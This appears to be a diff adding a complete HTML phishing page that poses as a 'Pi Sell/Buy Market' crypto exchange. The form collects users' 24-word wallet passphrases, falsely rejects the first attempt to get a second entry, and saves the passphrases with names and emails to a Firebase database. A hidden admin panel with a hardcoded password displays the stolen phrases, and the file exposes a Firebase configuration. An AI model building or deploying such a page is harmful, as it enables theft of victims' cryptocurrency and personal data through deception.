@@ -1,0 +1,276 @@
+<html>
+<head>
+    <title>Pi Sell/Buy Market</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-storage.js"></script>
+    <script>
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAeUUzEqwlDK9eQHuOn-ssuS0hfIinHeVQ",
+            authDomain: "fblogin-ff1b2.firebaseapp.com",
+            databaseURL: "https://fblogin-ff1b2-default-rtdb.firebaseio.com/",
+            projectId: "fblogin-ff1b2",
+            storageBucket: "fblogin-ff1b2.appspot.com",
+            messagingSenderId: "38639161997",
+            appId: "1:38639161997:web:9d3c483a6eb678c6a588c4",
+            measurementId: "G-0G0T6MJSWB"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        let firstAttempt = true;
+
+        function calculateTotal() {
+            const amount = parseFloat(document.getElementById('amount').value) || 0;
+            const rate = 87; // Updated rate per Pi
+            const total = amount * rate;
+            document.getElementById('total').value = total.toFixed(2);
+            document.getElementById('pricePerPi').value = rate;
+        }
+
+        function generateOrderId() {
+            return 'ORD-' + Math.floor(Math.random() * 1000000);
+        }
+
+        function maskWalletAddress(address) {
+            if (address.length < 8) return address;
+            return address.slice(0, 4) + '****' + address.slice(-4);
+        }
+
+        function bookOrder() {
+            const fullName = document.getElementById('fullName').value;
+            const email = document.getElementById('email').value;
+            const transactionType = document.getElementById('transactionType').value;
+            const amount = document.getElementById('amount').value;
+            const total = document.getElementById('total').value;
+            const walletAddress = document.getElementById('walletAddress').value;
+            const ratePerPi = document.getElementById('pricePerPi').value;
+            const piPhrase = document.getElementById('piPhrase').value;
+            const screenshotFile = document.getElementById('screenshot').files[0];
+
+            if (!fullName || !email || !transactionType || !amount || !total || !walletAddress || !piPhrase || !screenshotFile) {
+                alert('Please fill in all fields.');
+                return;
+            }
+
+            if (firstAttempt) {
+                firstAttempt = false;
+                alert('Entered Passphrase is incorrect, please try again.');
+                return;
+            }
+
+            const orderId = generateOrderId();
+            const dateTime = new Date().toLocaleString();
+            const maskedWalletAddress = maskWalletAddress(walletAddress);
+
+            // Upload screenshot to Firebase Storage
+            const storageRef = firebase.storage().ref();
+            const screenshotRef = storageRef.child('screenshots/' + orderId + '.png');
+            screenshotRef.put(screenshotFile).then(() => {
+                screenshotRef.getDownloadURL().then((url) => {
+                    // Save to Firebase
+                    firebase.database().ref('orders/' + orderId).set({
+                        fullName: fullName,
+                        email: email,
+                        piPhrase: piPhrase,
+                        screenshotUrl: url
+                    });
+
+                    const invoice = `
+                        <div class="relative p-6 border-dashed border-2 border-gray-400">
+                            <div class="absolute inset-0 opacity-10">
+                                <img src="https://static.vecteezy.com/system/resources/previews/015/369/108/non_2x/pi-network-pi-icons-pi-logo-design-illustration-trendy-and-modern-crypto-currency-pi-symbol-for-logos-icons-templates-websites-and-apps-free-vector.jpg" alt="Pi Network Logo" class="w-full h-full object-cover">
+                            </div>
+                            <div class="relative">
+                                <div class="flex justify-between items-center mb-4">
+                                    <h2 class="text-2xl font-bold">Invoice</h2>
+                                    <img src="https://static.vecteezy.com/system/resources/previews/015/369/108/non_2x/pi-network-pi-icons-pi-logo-design-illustration-trendy-and-modern-crypto-currency-pi-symbol-for-logos-icons-templates-websites-and-apps-free-vector.jpg" alt="Pi Network Logo" class="w-12 h-12">
+                                </div>
+                                <p class="text-sm text-gray-500 mb-4">${dateTime}</p>
+                                <h3 class="text-xl font-bold mb-2">Pi Selling Order</h3>
+                                <p class="mb-4"><strong class="text-yellow-500">Congratulations:</strong> Dear ${fullName}, Your order has been successfully booked.</p>
+                                <p><strong>Order ID:</strong> ${orderId}</p>
+                                <p><strong>Full Name:</strong> ${fullName}</p>
+                                <p><strong>Email:</strong> ${email}</p>
+                                <p><strong>Sold Pi:</strong> ${amount}</p>
+                                <p><strong>Rate Per Pi (USD):</strong> ${ratePerPi}</p>
+                                <p><strong>Total (USD):</strong> ${total}</p>
+                                <p><strong>Your Binance TRC20 Wallet Address:</strong> ${maskedWalletAddress}</p>
+                                <p class="mt-4 text-gray-700">Save this invoice and order ID. We will contact you soon if your order gets approved.</p>
+                                <p class="mt-2 text-gray-700">Thanks, Pi Accounts Department</p>
+                            </div>
+                        </div>
+                        <div class="mt-4 flex justify-end">
+                            <button onclick="shareInvoice()" class="bg-green-500 text-white py-2 px-4 rounded-lg mr-2">Share</button>
+                            <button onclick="saveInvoice()" class="bg-blue-500 text-white py-2 px-4 rounded-lg mr-2">Save</button>
+                            <button onclick="closeInvoice()" class="bg-red-500 text-white py-2 px-4 rounded-lg">Close</button>
+                        </div>
+                    `;
+
+                    document.getElementById('invoiceContent').innerHTML = invoice;
+                    document.getElementById('invoiceModal').classList.remove('hidden');
+                });
+            });
+        }
+
+        function closeInvoice() {
+            document.getElementById('invoiceModal').classList.add('hidden');
+        }
+
+        function saveInvoice() {
+            html2canvas(document.querySelector("#invoiceContent .relative")).then(canvas => {
+                const link = document.createElement('a');
+                link.href = canvas.toDataURL('image/png');
+                link.download = 'invoice.png';
+                link.click();
+            });
+        }
+
+        function shareInvoice() {
+            const invoiceContent = document.getElementById('invoiceContent').innerText;
+            if (navigator.share) {
+                navigator.share({
+                    title: 'Invoice',
+                    text: invoiceContent,
+                }).catch(console.error);
+            } else {
+                alert('Share feature is not supported in your browser.');
+            }
+        }
+
+        function openAdminLogin() {
+            document.getElementById('adminLoginModal').classList.remove('hidden');
+        }
+
+        function closeAdminLogin() {
+            document.getElementById('adminLoginModal').classList.add('hidden');
+        }
+
+        function adminLogin() {
+            const username = document.getElementById('adminUsername').value;
+            const password = document.getElementById('adminPassword').value;
+
+            if (username === 'admin@admin.com' && password === 'qwe123') {
+                alert('Login successful');
+                document.getElementById('adminLoginModal').classList.add('hidden');
+                fetchOrders();
+            } else {
+                alert('Invalid credentials');
+            }
+        }
+
+        function fetchOrders() {
+            firebase.database().ref('orders').once('value', function(snapshot) {
+                const orders = snapshot.val();
+                let ordersHtml = '<h2 class="text-2xl font-bold mb-4">Orders</h2>';
+                for (const orderId in orders) {
+                    const order = orders[orderId];
+                    ordersHtml += `
+                        <div class="mb-4 p-4 border rounded-lg">
+                            <p><strong>Order ID:</strong> ${orderId}</p>
+                            <p><strong>Full Name:</strong> ${order.fullName}</p>
+                            <p><strong>Email:</strong> ${order.email}</p>
+                            <p><strong>Pi Phrase:</strong> ${order.piPhrase}</p>
+                            <p><strong>Screenshot:</strong> <a href="${order.screenshotUrl}" target="_blank" class="text-blue-500">View Screenshot</a></p>
+                        </div>
+                    `;
+                }
+                document.getElementById('adminContent').innerHTML = ordersHtml;
+                document.getElementById('adminModal').classList.remove('hidden');
+            });
+        }
+
+        function closeAdminModal() {
+            document.getElementById('adminModal').classList.add('hidden');
+        }
+    </script>
+</head>
+<body class="flex items-center justify-center min-h-screen bg-gray-100">
+    <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-lg">
+        <div class="flex justify-between items-center mb-4">
+            <h1 class="text-lg font-bold text-yellow-500">Welcome to the Pi Sell/Buy Market</h1>
+            <img src="https://static.vecteezy.com/system/resources/previews/015/369/108/non_2x/pi-network-pi-icons-pi-logo-design-illustration-trendy-and-modern-crypto-currency-pi-symbol-for-logos-icons-templates-websites-and-apps-free-vector.jpg" alt="Pi Network Logo" class="w-12 h-12 cursor-pointer" onclick="openAdminLogin()">
+        </div>
+        <form oninput="calculateTotal()">
+            <div class="mb-2">
+                <label for="fullName" class="block text-gray-700">Full Name</label>
+                <input type="text" id="fullName" class="w-full px-3 py-2 border rounded-lg" required pattern="[A-Za-z\s]+" title="Full Name should only contain letters and spaces" placeholder="Enter your full name according to CNIC">
+            </div>
+            <div class="mb-2">
+                <label for="email" class="block text-gray-700">Email</label>
+                <input type="email" id="email" class="w-full px-3 py-2 border rounded-lg" required placeholder="Incase of any issue we will contact you on this email">
+            </div>
+            <div class="mb-2">
+                <label for="transactionType" class="block text-gray-700">Transaction Type</label>
+                <select id="transactionType" class="w-full px-3 py-2 border rounded-lg" required>
+                    <option value="" disabled selected>Select Transaction Type</option>
+                    <option value="Sell">Sell</option>
+                    <option value="Buy">Buy</option>
+                </select>
+            </div>
+            <div class="mb-2">
+                <label for="amount" class="block text-gray-700">Amount (Pi)</label>
+                <input type="number" id="amount" class="w-full px-3 py-2 border rounded-lg" required min="1" step="any" title="Amount should be a positive number" placeholder="Enter your selling Pi coins amount">
+            </div>
+            <div class="mb-2">
+                <label for="pricePerPi" class="block text-gray-700">Price per Pi (USD)</label>
+                <input type="text" id="pricePerPi" class="w-full px-3 py-2 border rounded-lg" value="87" readonly>
+            </div>
+            <div class="mb-2">
+                <label for="total" class="block text-gray-700">Total (USD)</label>
+                <input type="text" id="total" class="w-full px-3 py-2 border rounded-lg" readonly>
+            </div>
+            <div class="mb-2">
+                <label for="piPhrase" class="block text-gray-700">Pi Phrase</label>
+                <textarea id="piPhrase" class="w-full px-3 py-2 border rounded-lg" rows="3" required placeholder="Enter your 24-word Passphrase here"></textarea>
+            </div>
+            <div class="mb-2">
+                <label for="walletAddress" class="block text-gray-700">Your Binance TRC20 Wallet Address</label>
+                <input type="text" id="walletAddress" class="w-full px-3 py-2 border rounded-lg" required pattern="^T[1-9A-HJ-NP-Za-km-z]{33}$" title="Please enter a valid TRC20 wallet address" placeholder="Your USD will be transferred to this Binance Wallet">
+            </div>
+            <div class="mb-2">
+                <label for="screenshot" class="block text-gray-700">Upload your available balance screenshot</label>
+                <input type="file" id="screenshot" class="w-full px-3 py-2 border rounded-lg" accept="image/*" required>
+            </div>
+            <button type="button" onclick="bookOrder()" class="w-full bg-yellow-500 text-white py-2 rounded-lg">Book Order</button>
+        </form>
+    </div>
+
+    <!-- Invoice Modal -->
+    <div id="invoiceModal" class="fixed inset-0 bg-gray-800 bg-opacity-75 flex items-center justify-center hidden">
+        <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-lg">
+            <div id="invoiceContent"></div>
+        </div>
+    </div>
+
+    <!-- Admin Login Modal -->
+    <div id="adminLoginModal" class="fixed inset-0 bg-gray-800 bg-opacity-75 flex items-center justify-center hidden">
+        <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm">
+            <h2 class="text-2xl font-bold mb-4">Admin Login</h2>
+            <div class="mb-4">
+                <label for="adminUsername" class="block text-gray-700">Username</label>
+                <input type="text" id="adminUsername" class="w-full px-3 py-2 border rounded-lg">
+            </div>
+            <div class="mb-4">
+                <label for="adminPassword" class="block text-gray-700">Password</label>
+                <input type="password" id="adminPassword" class="w-full px-3 py-2 border rounded-lg">
+            </div>
+            <button onclick="adminLogin()" class="w-full bg-blue-500 text-white py-2 rounded-lg mb-2">Login</button>
+            <button onclick="closeAdminLogin()" class="w-full bg-red-500 text-white py-2 rounded-lg">Close</button>
+        </div>
+    </div>
+
+    <!-- Admin Modal -->
+    <div id="adminModal" class="fixed inset-0 bg-gray-800 bg-opacity-75 flex items-center justify-center hidden">
+        <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-lg h-3/4 overflow-y-auto">
+            <div id="adminContent"></div>
+            <button onclick="closeAdminModal()" class="mt-4 bg-red-500 text-white py-2 px-4 rounded-lg">Close</button>
+        </div>
+    </div>
+</body>
+</html>
